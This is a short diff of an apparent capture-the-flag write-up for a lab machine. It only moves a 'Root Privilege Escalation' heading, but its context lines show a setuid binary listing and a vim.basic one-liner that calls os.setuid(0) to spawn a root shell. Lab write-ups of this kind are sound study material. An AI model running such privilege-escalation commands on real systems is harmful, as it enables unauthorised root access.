@@ -183,6 +183,7 @@ drwxrwxr-x 2 william william 4096 Sep  4  2020 .nano
 -rwsrwsr-x 1 nobody  nogroup 8776 Sep  4  2020 script
 -rw-r----- 1 root    william   38 Sep  9  2020 user.txt
 ```
+## Root Privilege Escalation
 ```bash
 
 PUB="$(cat william.pub)"
@@ -260,7 +261,6 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)
 Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
 leonard@undiscovered
 ```
-## Root Privilege Escalation
 ```bash
 leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
 ^[[2;2RErase is control-H (^H).
